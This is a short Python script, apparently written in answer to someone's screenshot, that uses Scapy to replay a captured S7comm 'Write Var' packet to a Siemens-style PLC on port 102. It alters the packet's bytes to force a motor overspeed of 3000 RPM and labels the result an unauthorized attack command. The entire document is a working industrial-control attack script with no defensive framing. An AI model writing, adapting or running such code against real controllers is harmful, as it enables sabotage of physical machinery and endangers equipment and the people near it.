from scapy.all import *
import time

plc_ip = "192.168.0.1" # Destination from your screenshot
# Captured hex stream from Wireshark (S7comm Write Var)
# We change the last two bytes '05 dc' to '0b b8' (3000 RPM)
attack_hex = "0300002702f080320100000500000e00000501120a100200010001840000000004002001000b b8"

def inject_overspeed():
    pkt = IP(dst=plc_ip)/TCP(dport=102, sport=RandShort(), flags="PA")/Raw(load=bytes.fromhex(attack_hex.replace(" ", "")))

    send(pkt)
    

    time.sleep(7)
    print(f"ATTACK: Un authorized S7 Command (using replay) sent to {plc_ip}")

inject_overspeed()